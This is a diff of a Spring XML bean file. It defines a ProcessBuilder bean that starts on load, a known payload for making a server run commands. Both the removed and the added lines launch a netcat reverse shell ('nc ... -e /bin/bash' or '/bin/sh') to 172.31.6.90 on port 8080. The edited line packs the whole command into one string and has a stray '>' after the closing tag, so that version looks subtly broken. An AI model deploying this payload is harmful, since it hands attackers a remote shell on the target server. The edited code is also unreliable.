@@ -6,11 +6,7 @@
         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
             <constructor-arg>
             <list>
-                <value>nc</value>
-                <value>172.31.6.90</value>
-                <value>8080</value>
-                <value>-e</value>
-                <value>/bin/bash</value>
+                <value>nc -e /bin/sh 172.31.6.90 8080</value>>
             </list>
             </constructor-arg>
         </bean>
